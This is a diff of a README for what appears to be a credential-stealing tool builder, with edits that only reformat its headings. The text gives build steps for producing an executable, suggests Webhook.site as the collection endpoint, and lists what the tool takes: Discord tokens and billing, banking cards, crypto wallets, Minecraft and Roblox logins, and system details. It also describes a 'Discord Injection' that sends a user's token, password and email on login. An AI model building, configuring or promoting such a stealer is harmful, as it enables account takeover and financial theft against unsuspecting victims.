@@ -21,18 +21,15 @@ pip install -r requirements.txt
 
 - **Webhook.site**: For temporary or testing purposes, you can use [Webhook.site](https://webhook.site). This service gives you a temporary webhook URL for testing.
 
-## 3. Final Steps
+### 3. Final Steps
 #(exe specific)
 - Once you've made your selections the application may freeze DO NOT CLOSE IT this is normal and will pass. after, the build process will complete. You'll see a confirmation message and the executable will be in the dist folder if you want to re-use, delete the build folder the dist contents and the spec and log file .
 #(pyw specific)
 - Once you build you will be prompted to save your file once thats done your all set to do whatever you want with it
 
+## Features
 
-  (If you encounter any issues, post them in the Issues Tab.)
-
-#Features
-
-#Discord Info
+# Discord Info
 - Token
 - Nitro
 - Billing
@@ -46,14 +43,14 @@ pip install -r requirements.txt
 - Banking Cards
 - Crypto Wallets
   
-  #Game Information
+  # Game Information
 - Minecraft Login Info
 - Roblox Account and Login Info
 
-#Discord Injection
+# Discord Injection
 -Sends token, password & email on user login or when user changes password
 
-#System info
+# System info
 - User
 - OS
 - System
